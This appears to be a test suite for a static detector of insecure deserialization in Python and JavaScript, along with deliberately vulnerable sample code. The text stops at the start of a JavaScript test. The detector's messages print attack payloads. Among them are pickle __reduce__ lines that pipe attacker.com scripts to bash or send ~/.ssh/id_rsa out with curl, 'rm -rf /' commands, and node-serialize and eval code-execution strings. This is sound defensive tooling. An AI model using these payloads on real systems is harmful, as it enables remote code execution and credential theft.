"""
Test suite for detecting Insecure Deserialization vulnerabilities.
"""
import re
import sys
from pathlib import Path
from typing import Dict

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class DeserializationDetector:
    """Detects insecure deserialization vulnerabilities in code."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "python") -> Dict:
        """Analyze code for insecure deserialization vulnerabilities."""
        if language == "python":
            return self._analyze_python(code)
        elif language == "javascript":
            return self._analyze_javascript(code)
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}

    def _analyze_python(self, code: str) -> Dict:
        """Analyze Python code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: pickle.load/loads (most dangerous - DESERIALIZATION)
        pickle_deserialize_patterns = [
            r'pickle\.load\(',
            r'pickle\.loads\(',
        ]

        pickle_deserialize_locations = []
        for pattern in pickle_deserialize_patterns:
            pickle_deserialize_locations.extend(find_pattern_locations(code, pattern))

        # Pattern 1b: pickle.dumps/dump (SERIALIZATION - enables future deserialization attacks)
        pickle_serialize_patterns = [
            r'pickle\.dump\(',
            r'pickle\.dumps\(',
        ]

        pickle_serialize_locations = []
        for pattern in pickle_serialize_patterns:
            pickle_serialize_locations.extend(find_pattern_locations(code, pattern))

        if pickle_deserialize_locations:
            # Check if data source is user-controlled
            has_user_data = any([
                re.search(r'open\([^)]*input|open\([^)]*request|open\([^)]*user', code, re.IGNORECASE),
                re.search(r'pickle\.load.*request\.|pickle\.load.*user', code, re.IGNORECASE),
                re.search(r'def\s+load_\w+\([^)]*file[^)]*\)', code),  # Function taking filename parameter
                re.search(r'def\s+\w+\([^)]*data[^)]*\).*pickle\.loads', code, re.DOTALL),
                re.search(r'\.read\(\).*pickle\.loads', code, re.DOTALL),
            ])

            # Check for cache-based pickle deserialization with user-controlled keys
            # Pattern: cache key derived from user input (args/kwargs) → attacker can predict filename
            has_cache_pickle = any([
                re.search(r'cache.*pickle|pickle.*cache', code, re.IGNORECASE),
                re.search(r'def\s+cache_\w+|@\w*cache\w*|functools\.wraps', code),
            ])

            has_user_controlled_cache_key = any([
                re.search(r'def\s+\w+_key\w*\([^)]*args|def\s+\w+_key\w*\([^)]*kwargs', code),
                re.search(r'pickle\.dumps\(\(args|pickle\.dumps\(\(.*kwargs', code),
                re.search(r'cache.*\*args|\*\*kwargs', code),
            ])

            # If it's a caching system with pickle and user-controlled cache keys
            if has_cache_pickle and has_user_controlled_cache_key:
                has_user_data = True  # Treat as user-controlled

            # Check for validation/signing
            # IMPORTANT: hashlib alone is NOT signing - must have HMAC verification
            # Pattern: hashlib used for cache keys (/hashing) ≠ HMAC signing/verification
            has_signing = any([
                re.search(r'hmac\.new|hmac\.compare_digest|verify.*hmac', code, re.IGNORECASE),
                re.search(r'itsdangerous|cryptography|nacl', code),
                re.search(r'verify.*signature|check.*signature', code, re.IGNORECASE),
            ])

            if not has_signing:
                # Use first location for reporting
                location = pickle_deserialize_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                if has_user_data:
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "CRITICAL",
                        "description": "Uses pickle.load() on user-controlled data - REMOTE CODE EXECUTION: pickle can execute arbitrary Python code during deserialization. ATTACK POC: Attacker creates malicious pickle: class Exploit: def __reduce__(self): return (os.system, ('rm -rf /',)). When victim calls pickle.loads(attacker_data), it executes os.system('rm -rf /'). IMPACT: Complete server compromise, data theft, ransomware deployment, botnet installation. REAL-WORLD: Pickle deserialization RCE is CVE-worthy vulnerability, used in real attacks against Django, Flask, Jupyter apps.",
                        "recommendation": "NEVER use pickle with untrusted data. Use JSON instead: json.loads(data). If you must serialize Python objects, use itsdangerous.Serializer with HMAC signing: from itsdangerous import Serializer; s = Serializer(secret_key); obj = s.loads(data)",
                        "example_attack": "import pickle, os; exploit = pickle.dumps(type('Exploit', (), {'__reduce__': lambda self: (os.system, ('curl attacker.com/shell.sh | bash',))})()) → sending this to victim's pickle.loads() gives attacker reverse shell",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "pickle.load() or pickle.loads() called on data from untrusted source",
                                "User-controlled input (HTTP requests, file uploads, external APIs) deserialized with pickle",
                                "No HMAC signature verification or cryptographic validation before deserialization",
                                "Python's pickle module can execute arbitrary code via __reduce__ method"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: pickle.load() or pickle.loads() processes untrusted data",
                                "Data source is user-controlled (request parameters, file uploads, cache with user-controlled keys)",
                                "pickle.load() automatically calls __reduce__ method during deserialization",
                                "Attacker can craft malicious pickle with __reduce__ returning (os.system, ('malicious command',))",
                                "No signature verification - application cannot distinguish legitimate data from attacker payloads",
                                "ATTACK: pickle.loads(malicious_data) → executes os.system('curl attacker.com/shell | bash') → reverse shell"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "pickle.load() and pickle.loads() usage",
                                "User data sources (request.*, open(), file parameters, cache keys from args/kwargs)",
                                "HMAC signature verification (hmac.new, hmac.compare_digest, itsdangerous)",
                                "Safe alternatives (json.loads, yaml.safe_load)"
                            ],
                            "evidence": {
                                "found_patterns": ["pickle.load/loads with user-controlled data source"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0
                else:
                    # Still vulnerable if attacker can modify files
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "HIGH",
                        "description": "Uses pickle without signature verification - ARBITRARY CODE EXECUTION RISK: pickle.load() can execute code if attacker modifies pickle files. ATTACK SCENARIO: (1) App stores user preferences in ~/.cache/app.pickle, (2) Attacker modifies file with malicious payload using __reduce__ method, (3) App loads pickle → executes attacker's code. VULNERABLE EVEN IF: data isn't from HTTP request, attacker just needs filesystem access (shared hosting, container escape, stolen backup). IMPACT: Privilege escalation, backdoor installation, data exfiltration.",
                        "recommendation": "Replace pickle with JSON for data: json.load(f). If you need Python object serialization, use signed pickle: from itsdangerous import Serializer; s = Serializer(SECRET_KEY); data = s.dumps(obj); obj = s.loads(data) # HMAC verified",
                        "example_attack": "User modifies ~/.config/app.pickle with: class Evil: __reduce__ = lambda self: (__import__('os').system, ('cat ~/.ssh/id_rsa | curl -d @- attacker.com',)) → next app startup steals SSH keys",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "pickle.load() used on files or data without HMAC signature verification",
                                "No user-controlled data detected, but pickle files could be modified by attacker",
                                "Attacker with filesystem access can inject malicious pickle data",
                                "Missing cryptographic integrity protection (HMAC, digital signatures)"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: pickle.load() without signature verification",
                                "Even if data source appears trusted (local files), attacker can modify pickle files",
                                "ATTACK SCENARIOS: shared hosting (other users modify files), container escape, stolen backups, compromised developer machine",
                                "pickle.load() executes __reduce__ method automatically during deserialization",
                                "No HMAC or signature check - application cannot detect if pickle was tampered with",
                                "IMPACT: Attacker modifies ~/.cache/app.pickle → next load executes arbitrary code"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "pickle.load() and pickle.loads() usage",
                                "HMAC verification patterns (hmac.new, hmac.compare_digest, verify_signature)",
                                "Signed serialization libraries (itsdangerous, cryptography, nacl)",
                                "Safe alternatives (json.load, yaml.safe_load)"
                            ],
                            "evidence": {
                                "found_patterns": ["pickle.load/loads without signature verification"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0

        # Pattern 1c: Check for pickle.dumps/dump usage (WARNING - enables future attacks)
        if pickle_serialize_locations and not pickle_deserialize_locations:
            # Code serializes with pickle but we don't see deserialization in same file
            # This is still risky because the pickled data will need to be deserialized somewhere
            location = pickle_serialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            has_signing = any([
                re.search(r'hmac\.new|hmac\.compare_digest|verify.*hmac', code, re.IGNORECASE),
                re.search(r'itsdangerous|cryptography|nacl', code),
                re.search(r'verify.*signature|check.*signature', code, re.IGNORECASE),
            ])

            if not has_signing:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses pickle.dumps() to serialize data - ENABLES CODE EXECUTION ATTACKS: Any code that deserializes this pickle data (pickle.loads/load) is vulnerable to arbitrary code execution. ATTACK CHAIN: (1) App stores user data with pickle.dumps(), (2) Attacker injects malicious object before serialization OR modifies pickled bytes after storage, (3) When app/user deserializes → code execution. VULNERABLE SCENARIOS: Caching systems (Redis, files), session storage, message queues, database BLOB fields. IMPACT: Anyone who can trigger deserialization (different function, different server, different user) can execute code.",
                    "recommendation": "Use JSON for data serialization: json.dumps(data) instead of pickle.dumps(). JSON is data-only, cannot execute code. If you MUST serialize Python objects, sign the data: from itsdangerous import Serializer; s = Serializer(SECRET_KEY); signed_data = s.dumps(obj)",
                    "example_attack": "Cache stores pickle.dumps(user_obj). Attacker creates malicious user object with __reduce__ = lambda: (os.system, ('evil',)). When cache.get() deserializes → RCE. Even if attacker can't control serialization, they can modify pickle bytes in storage (Redis, filesystem, database).",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "pickle.dumps() or pickle.dump() used to serialize data without signature",
                            "Serialized pickle data stored in cache, database, files, or message queue",
                            "No HMAC signing to protect integrity of serialized data",
                            "Future deserialization (pickle.load/loads) will execute code if data is tampered with"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: pickle.dumps() serializes data without signing",
                            "Pickle data will be stored and later deserialized, creating attack opportunity",
                            "ATTACK VECTOR 1: Attacker injects malicious object before serialization (if they control input)",
                            "ATTACK VECTOR 2: Attacker modifies pickle bytes after storage (Redis, files, DB have weaker access controls)",
                            "When deserialization occurs (same or different function), malicious __reduce__ executes",
                            "No HMAC signature - deserializer cannot verify data integrity",
                            "IMPACT: RCE when deserialization happens, possibly in different context (different user, server, privilege level)"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "pickle.dumps() and pickle.dump() usage",
                            "pickle.loads() and pickle.load() in same file (deserialization vulnerability)",
                            "HMAC signing patterns (hmac.new, itsdangerous.Serializer)",
                            "Safe alternatives (json.dumps)"
                        ],
                        "evidence": {
                            "found_patterns": ["pickle.dumps/dump without signature"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: PyYAML unsafe loading
        uses_unsafe_yaml = any([
            re.search(r'yaml\.load\([^,)]*\)', code),  # yaml.load() without Loader
            re.search(r'yaml\.unsafe_load\(', code),
            re.search(r'yaml\.load\([^)]*Loader\s*=\s*yaml\.Loader\)', code),
        ])

        if uses_unsafe_yaml:
            yaml_locations = []
            for pattern in [r'yaml\.load\([^,)]*\)', r'yaml\.unsafe_load\(', r'yaml\.load\([^)]*Loader\s*=\s*yaml\.Loader\)']:
                yaml_locations.extend(find_pattern_locations(code, pattern))

            if yaml_locations:
                location = yaml_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']
            else:
                line_num = 0
                code_snippet = ""

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "CRITICAL",
                "description": "Uses yaml.load() without safe_load - allows arbitrary code execution (use yaml.safe_load())",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "yaml.load() called without Loader=yaml.SafeLoader parameter",
                        "yaml.unsafe_load() explicitly used (dangerous API)",
                        "yaml.load() with Loader=yaml.Loader (full Python object construction)",
                        "YAML deserialization can instantiate arbitrary Python objects and execute code"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: yaml.load() without SafeLoader or yaml.unsafe_load() used",
                        "PyYAML's default Loader can construct arbitrary Python objects from YAML",
                        "ATTACK: Attacker sends YAML with !!python/object/apply directive to execute functions",
                        "EXAMPLE: !!python/object/apply:os.system ['rm -rf /'] → executes os.system('rm -rf /')",
                        "REAL-WORLD: CVE-2017-18342, used in attacks against config parsers and web apps",
                        "IMPACT: Remote code execution, complete system compromise"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "yaml.load() without Loader parameter (defaults to unsafe FullLoader in old PyYAML)",
                        "yaml.unsafe_load() explicit usage",
                        "yaml.load() with Loader=yaml.Loader (full object construction)",
                        "yaml.safe_load() usage (safe alternative)"
                    ],
                    "evidence": {
                        "found_patterns": ["Unsafe YAML loading"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 3: marshal (also dangerous)
        marshal_locations = find_pattern_locations(code, r'marshal\.load')
        if marshal_locations:
            location = marshal_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "HIGH",
                "description": "Uses marshal.load() - can execute arbitrary bytecode (use JSON for data)",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "marshal.load() or marshal.loads() used to deserialize data",
                        "marshal can deserialize Python bytecode objects (code objects)",
                        "Attacker-controlled marshal data can contain malicious bytecode",
                        "No integrity verification or sandboxing of deserialized bytecode"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: marshal.load() deserializes data that may contain bytecode",
                        "marshal is designed for Python bytecode (.pyc files), not data serialization",
                        "Can deserialize code objects which execute when called or instantiated",
                        "ATTACK: Attacker crafts malicious marshal data with bytecode payload",
                        "EXAMPLE: marshal.dumps(compile('__import__(\"os\").system(\"evil\")', '', 'exec')) → RCE",
                        "IMPACT: Arbitrary bytecode execution, similar to eval() but harder to detect"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "marshal.load() and marshal.loads() usage",
                        "marshal.dump() and marshal.dumps() usage (serialization side)",
                        "Safe alternatives (json.load for data)"
                    ],
                    "evidence": {
                        "found_patterns": ["marshal.load usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 4: shelve (uses pickle internally)
        shelve_locations = find_pattern_locations(code, r'shelve\.open\(')
        if shelve_locations:
            has_signing = re.search(r'hmac|signature|verify', code, re.IGNORECASE)
            if not has_signing:
                location = shelve_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "MEDIUM",
                    "description": "Uses shelve (pickle-based) without integrity checks - vulnerable to tampering",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "shelve.open() used for persistent storage (uses pickle internally)",
                            "No HMAC or signature verification for shelve database integrity",
                            "Attacker with filesystem access can modify shelve database files",
                            "shelve uses pickle for serialization - inherits pickle's code execution risks"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: shelve.open() creates pickle-based database",
                            "shelve internally uses pickle to serialize/deserialize stored objects",
                            "No integrity protection - attacker can modify .db/.dat files",
                            "ATTACK: Attacker modifies shelve database file with malicious pickle data",
                            "When application reads from shelve, pickle.load() executes attacker's __reduce__ method",
                            "IMPACT: Code execution on next database read, privilege escalation"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "shelve.open() usage",
                            "HMAC or signature verification patterns",
                            "Safe alternatives (SQLite with JSON, Redis with JSON)"
                        ],
                        "evidence": {
                            "found_patterns": ["shelve.open without integrity checks"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 1:
                    self.score = 1

        # Pattern 5: Check for safe alternatives (positive indicator)
        uses_safe_serialization = any([
            re.search(r'json\.load|json\.loads|json\.dump|json\.dumps', code),
            re.search(r'yaml\.safe_load\(', code),
            re.search(r'itsdangerous\.Serializer', code),
        ])

        if uses_safe_serialization and len(pickle_deserialize_locations) == 0 and len(pickle_serialize_locations) == 0 and not uses_unsafe_yaml:
            # Find location of safe serialization
            safe_locations = []
            safe_locations.extend(find_pattern_locations(code, r'json\.load|json\.loads'))
            safe_locations.extend(find_pattern_locations(code, r'yaml\.safe_load\('))
            safe_locations.extend(find_pattern_locations(code, r'itsdangerous\.Serializer'))

            if safe_locations:
                location = safe_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']
            else:
                line_num = 0
                code_snippet = ""

            # Determine which method is used
            uses_json = re.search(r'json\.load|json\.loads|json\.dump|json\.dumps', code)
            uses_yaml_safe = re.search(r'yaml\.safe_load\(', code)
            uses_itsdangerous = re.search(r'itsdangerous\.Serializer', code)

            methods = []
            if uses_json:
                methods.append("JSON (data-only, no code execution)")
            if uses_yaml_safe:
                methods.append("yaml.safe_load() (restricted YAML)")
            if uses_itsdangerous:
                methods.append("itsdangerous (signed serialization)")

            methods_str = " + ".join(methods) if methods else "safe serialization"

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": f"Uses safe serialization: {methods_str}",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "pickle.load/loads on untrusted data (arbitrary code execution)",
                        "yaml.load without SafeLoader (object instantiation attacks)",
                        "marshal.load on untrusted data (bytecode execution)",
                        "shelve without integrity protection (pickle-based tampering)"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        item for item in [
                            f"Line {line_num}: Uses {methods_str} for serialization",
                            "JSON is data-only format - cannot represent code or objects with methods" if uses_json else None,
                            "yaml.safe_load() only constructs simple Python types (dict, list, str, int)" if uses_yaml_safe else None,
                            "itsdangerous provides HMAC-signed serialization with tamper detection" if uses_itsdangerous else None,
                            "No pickle usage detected - avoids arbitrary code execution risk",
                            "No unsafe YAML loading (yaml.load, yaml.unsafe_load)"
                        ] if item is not None
                    ],
                    "patterns_checked": [
                        "pickle.load/loads and pickle.dump/dumps",
                        "yaml.load without SafeLoader",
                        "marshal.load",
                        "shelve.open",
                        "Safe alternatives: json, yaml.safe_load, itsdangerous"
                    ],
                    "evidence": {
                        "found_patterns": [methods_str],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_javascript(self, code: str) -> Dict:
        """Analyze JavaScript code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: eval() on serialized data
        eval_locations = find_pattern_locations(code, r'eval\(')
        uses_eval = len(eval_locations) > 0

        if uses_eval:
            has_user_data = any([
                re.search(r'eval\([^)]*req\.|eval\([^)]*request', code),
                re.search(r'eval\([^)]*cookie|eval\([^)]*localStorage', code),
                re.search(r'eval\([^)]*\.read|eval\([^)]*\.data', code),
            ])

            location = eval_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if has_user_data:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "CRITICAL",
                    "description": "Uses eval() on user data - allows arbitrary code execution (use JSON.parse())",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "eval() function called on user-controlled data",
                            "Data from HTTP requests (req.body, req.query, req.params) passed to eval()",
                            "Data from cookies or localStorage passed to eval()",
                            "eval() can execute arbitrary JavaScript code from string input"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: eval() processes user-controlled data from HTTP request or storage",
                            "eval() interprets string as JavaScript code and executes it",
                            "ATTACK: User sends malicious code in data: eval('(' + attacker_payload + ')') → code execution",
                            "EXAMPLE: attacker_payload = 'require(\"child_process\").exec(\"curl attacker.com | bash\")' → reverse shell",
                            "No input validation can prevent eval() attacks - any valid JavaScript syntax executes",
                            "IMPACT: Remote code execution, server compromise, data theft, denial of service"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "eval() usage with user data sources (req.*, cookie, localStorage)",
                            "Safe alternatives (JSON.parse)",
                            "Function() constructor (similar vulnerability)",
                            "node-serialize.unserialize() usage"
                        ],
                        "evidence": {
                            "found_patterns": ["eval() with user-controlled data"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0
            else:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses eval() - dangerous if data source is compromised (use JSON.parse())",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "eval() function used (inherently dangerous)",
                            "Data source not identified as user-controlled, but could be compromised",
                            "eval() executes any JavaScript code in string form",
                            "Risk exists if data source (file, database, cache) is tampered with"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: eval() used on data source",
                            "Even if data isn't directly from HTTP request, eval() is risky",
                            "ATTACK SCENARIOS: compromised config file, modified cache data, database injection",
                            "eval() has no way to restrict what code can execute",
                            "EXAMPLE: eval(data_from_file) where file contains require('child_process').exec('malicious')",
                            "IMPACT: Code execution if attacker can modify data source"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "eval() usage patterns",
                            "User data sources (req.*, cookie, localStorage)",
                            "Safe alternatives (JSON.parse)",
                            "Function() constructor usage"
                        ],
                        "evidence": {
                            "found_patterns": ["eval() usage"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: node-serialize unserialize()
        node_serialize_locations = find_pattern_locations(code, r'serialize\.unserialize\(')
        uses_node_serialize = len(node_serialize_locations) > 0

        if uses_node_serialize:
            location = node_serialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "CRITICAL",
                "description": "Uses node-serialize.unserialize() - allows remote code execution (use JSON.parse())",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "node-serialize.unserialize() used to deserialize data",
                        "node-serialize can deserialize and execute JavaScript functions from serialized form",
                        "Attacker can craft malicious serialized payload with IIFE (Immediately Invoked Function Expression)",
                        "No safe deserialization mode available in node-serialize"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: node-serialize.unserialize() processes serialized data",
                        "node-serialize preserves functions during serialization, re-executes them on deserialization",
                        "ATTACK: Attacker sends serialized payload with IIFE: {'rce':'_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"evil\")}()'}",
                        "unserialize() automatically executes the function when deserializing",
                        "REAL-WORLD: CVE-2017-5941, node-serialize RCE vulnerability widely exploited",
                        "IMPACT: Remote code execution, complete server compromise, reverse shell"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "node-serialize.unserialize() usage",
                        "serialize.serialize() usage (creates vulnerable data)",
                        "Safe alternatives (JSON.parse, JSON.stringify)"
                    ],
                    "evidence": {
                        "found_patterns": ["node-serialize.unserialize() usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 3: Function constructor (similar to eval)
        function_constructor_locations = find_pattern_locations(code, r'new\s+Function\(')
        if function_constructor_locations:
            has_user_data = re.search(r'new\s+Function\([^)]*req\.|new\s+Function\([^)]*cookie', code)
            if has_user_data:
                location = function_constructor_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "CRITICAL",
                    "description": "Uses Function() constructor on user data - allows code execution",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Function() constructor called with user-controlled data",
                            "Data from HTTP requests or cookies used to construct function",
                            "Function() constructor compiles and can execute arbitrary JavaScript code",
                            "Similar security risk to eval() but harder to detect"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: Function() constructor uses user-controlled data",
                            "new Function(args, body) compiles string body as JavaScript function",
                            "ATTACK: new Function(req.body.code) where req.body.code = 'return require(\"child_process\").exec(\"evil\")'",
                            "Function created from user input can execute arbitrary code when called",
                            "EXAMPLE: const fn = new Function(user_input); fn() → executes attacker's code",
                            "IMPACT: Remote code execution, server compromise, same as eval() vulnerability"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "new Function() constructor with user data (req.*, cookie)",
                            "eval() usage patterns",
                            "Safe alternatives (JSON.parse, predefined function maps)"
                        ],
                        "evidence": {
                            "found_patterns": ["Function() constructor with user data"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 4: vm.runInContext without proper sandboxing
        vm_run_locations = find_pattern_locations(code, r'vm\.run')
        if vm_run_locations:
            has_sandbox = re.search(r'createContext\(.*\{.*\}\)', code)
            if not has_sandbox:
                location = vm_run_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses vm.run without proper sandbox - can lead to code execution",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "vm.runInContext, vm.runInThisContext, or vm.runInNewContext used",
                            "No proper sandbox context created with createContext()",
                            "vm module provides access to V8 JavaScript engine",
                            "Without sandbox, code can access Node.js APIs and file system"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: vm.run* method used without proper sandbox",
                            "Node.js vm module executes code in V8 context but can escape without sandbox",
                            "Without createContext() restrictions, code can access process, require, fs modules",
                            "ATTACK: vm.runInContext(user_code) where user_code accesses global.process.mainModule.require('child_process')",
                            "SANDBOX ESCAPE: Even with context, vm2 had multiple escapes (CVE-2023-29199, CVE-2023-30547)",
                            "IMPACT: Code execution, sandbox escape, file system access, require() abuse"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "vm.runInContext, vm.runInThisContext, vm.runInNewContext usage",
                            "createContext() with restrictive sandbox object",
                            "Safe alternatives (isolated workers, separate processes)"
                        ],
                        "evidence": {
                            "found_patterns": ["vm.run without proper sandbox"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 1:
                    self.score = 1

        # Pattern 5: Check for safe alternatives
        json_parse_locations = find_pattern_locations(code, r'JSON\.parse\(')
        uses_json_parse = len(json_parse_locations) > 0

        if uses_json_parse and not uses_eval and not uses_node_serialize:
            location = json_parse_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses safe JSON.parse() for deserialization",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "eval() on user data (arbitrary JavaScript code execution)",
                        "node-serialize.unserialize() (function deserialization and execution)",
                        "new Function() constructor with user input (dynamic code compilation)",
                        "vm.run without sandbox (V8 context escape)"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses JSON.parse() for deserialization",
                        "JSON.parse() only parses data - cannot execute code or create functions",
                        "JSON format is restricted to data types: object, array, string, number, boolean, null",
                        "No function deserialization - JSON cannot represent executable code",
                        "Safe against code injection attacks that exploit eval() or node-serialize",
                        "Built-in protection: JSON.parse() throws SyntaxError on malformed input instead of executing it"
                    ],
                    "patterns_checked": [
                        "eval() usage",
                        "node-serialize.unserialize() usage",
                        "new Function() constructor",
                        "vm.run* methods",
                        "JSON.parse() and JSON.stringify() (safe alternatives)"
                    ],
                    "evidence": {
                        "found_patterns": ["JSON.parse() usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_deserial_python_pickle_vulnerable():
    """Test detection of insecure pickle usage."""
    vulnerable_code = '''
import pickle

def load_preferences(filename):
    with open(filename, 'rb') as file:
        return pickle.load(file)
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect insecure pickle usage"


def test_deserial_python_pickle_user_data():
    """Test detection of pickle with user-controlled data."""
    vulnerable_code = '''
import pickle
from flask import request

@app.route('/load')
def load_data():
    data = request.files['data'].read()
    obj = pickle.loads(data)  # CRITICAL!
    return str(obj)
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect pickle on user data"
    assert any("user-controlled data" in v["description"].lower() for v in result["vulnerabilities"])


def test_deserial_python_json_secure():
    """Test detection of safe JSON usage."""
    secure_code = '''
import json

def load_preferences(filename):
    with open(filename, 'r') as file:
        return json.load(file)
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "python")
    assert result["score"] == 2, "Should recognize safe JSON usage"


def test_deserial_python_yaml_unsafe():
    """Test detection of unsafe YAML loading."""
    vulnerable_code = '''
import yaml

def load_config(filename):
    with open(filename) as f:
        return yaml.load(f)  # Missing Loader parameter!
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect unsafe yaml.load()"


def test_deserial_python_yaml_safe():
    """Test detection of safe YAML loading."""
    secure_code = '''
import yaml

def load_config(filename):
    with open(filename) as f:
        return yaml.safe_load(f)
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "python")
    assert result["score"] == 2, "Should recognize safe yaml.safe_load()"


def test_deserial_javascript_eval_vulnerable():
